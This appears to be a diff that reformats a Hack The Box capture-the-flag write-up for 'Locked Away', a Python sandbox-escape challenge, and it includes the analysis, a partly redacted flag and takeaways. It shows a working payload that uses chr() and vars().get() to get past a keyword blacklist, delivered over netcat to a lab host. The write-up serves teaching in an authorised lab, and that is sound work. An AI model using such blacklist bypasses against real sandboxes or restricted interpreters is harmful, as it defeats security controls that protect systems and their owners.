@@ -1,35 +1,56 @@
-# Locked Away - Hack The Box Labs
+<div align="center">
 
-![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)
-![Category: Misc](https://img.shields.io/badge/Category-Misc-blue)
-![Points: 975](https://img.shields.io/badge/Points-975-yellow)
+# Locked Away — HackTheBox
 
-## Challenge Info
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-N%2FA-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
 
-**Keywords:** python sandbox escape, chr() bypass, vars().get(), blacklist bypass, code injection, restricted shell, exec, python jail, character code construction, open_chest, dictionary methods, introspection bypass, misc easy 975 points  
-**Tags:** #python #sandbox #blacklist-bypass #chr #vars #exec #jailbreak #misc-easy #hackthebox #ctf  
-**Flag:** `HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_████████████████████████████████}`  
-**Search Terms:** how to bypass python blacklist, python sandbox escape chr, python vars get bypass, restricted python shell escape, python exec bypass, open_chest function call, hackthebox locked away walkthrough, hackthebox locked away solution, lockedaway htb, locked-away ctf
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
 
-- **Name**: Locked Away
-- **Category**: Misc
-- **Difficulty**: Easy
-- **Points**: 975
-- **Date**: 2026-03-18
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
+
+---
+
+</div>
+
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
+
+## Target Information
+
+| Property | Value |
+|----------|-------|
+| Machine | Locked Away |
+| IP | `<CHALLENGE_IP>` |
+| OS | N/A |
+| Difficulty | Easy |
+| Category | Misc |
+| Port | 32011 |
+| Points | 975 |
+
+## Table of Contents
+
+1. [Description](#description)
+2. [Analysis](#analysis)
+3. [Vulnerability](#vulnerability)
+4. [Exploitation](#exploitation)
+5. [Payload Delivery](#payload-delivery)
+6. [Key Takeaways](#key-takeaways)
+7. [Tools Used](#tools-used)
+8. [References](#references)
+9. [Flags](#flags)
+
+---
 
 ## Description
 
 A test! Getting onto the team is one thing, but you must prove your skills to be chosen to represent the best of the best. They have given you the classic - a restricted environment, devoid of functionality, and it is up to you to see what you can do. Can you break open the chest?
 
-## Target Information
+---
 
-- **IP**: <CHALLENGE_IP>
-- **Port**: 32011
-- **Type**: Python Sandbox Escape
-
-## Solution
-
-### Analysis
+## Analysis
 
 The challenge provided a restricted Python interpreter running via a socket server. The `main.py` contained the following security controls:
 
@@ -55,15 +76,19 @@ while True:
 
 The `open_chest()` function was available in the global scope to read the flag, but the string "open" was blacklisted.
 
-### Vulnerability
+---
 
-**Type**: Python Sandbox Escape via Character Code Construction
+## Vulnerability
+
+**Type:** Python Sandbox Escape via Character Code Construction
 
 The blacklist blocked direct access to `open_chest()` and common bypass techniques like string concatenation with quotes. However, Python's `chr()` function and dictionary methods were not blocked.
 
-### Exploitation
+---
 
-**Bypass Technique**: Use `chr()` to dynamically construct the string "open_chest" from ASCII codes, bypassing the string literal blacklist.
+## Exploitation
+
+**Bypass Technique:** Use `chr()` to dynamically construct the string "open_chest" from ASCII codes, bypassing the string literal blacklist.
 
 ```python
 # chr(111) = 'o'
@@ -79,26 +104,27 @@ The blacklist blocked direct access to `open_chest()` and common bypass techniqu
 vars().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()
 ```
 
-**Why it works**:
+**Why it works:**
 - `vars()` returns the current scope's dictionary
 - `.get()` retrieves the function without using square brackets (which are blocked)
 - `chr()` constructs the function name without using quotes
 - `()` executes the retrieved function
 
-### Payload
+---
+
+## Payload Delivery
 
 ```bash
-$ nc <CHALLENGE_IP> 32011
+nc <CHALLENGE_IP> 32011
+```
+
+```text
 [banner displayed]
 The chest lies waiting... vars().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()
 HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_████████████████████████████████}
 ```
 
-## Flag
-
-```
-HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_████████████████████████████████}
-```
+---
 
 ## Key Takeaways
 
@@ -107,14 +133,39 @@ HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_███████████�
 3. Python's introspection functions (`vars()`, `locals()`, `globals()`) provide multiple paths to access objects
 4. Blacklists are often incomplete - always look for alternative ways to achieve the same goal
 
+---
+
 ## Tools Used
 
-- `nc` (netcat) - TCP connection to target
-- `chr()` - Python built-in for character code construction
-- `vars()` - Python built-in for scope introspection
+| Tool | Purpose |
+|------|---------|
+| nc (netcat) | TCP connection to target |
+| chr() | Python built-in for character code construction |
+| vars() | Python built-in for scope introspection |
+
+---
 
 ## References
 
 - [Python chr() Function](https://docs.python.org/3/library/functions.html#chr)
 - [Python vars() Function](https://docs.python.org/3/library/functions.html#vars)
 
+---
+
+## Flags
+
+| Flag | Value |
+|------|-------|
+| Challenge | `HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_████████████████████████████████}` |
+
+---
+
+<div align="center">
+
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — Locked Away*
+
+</div>
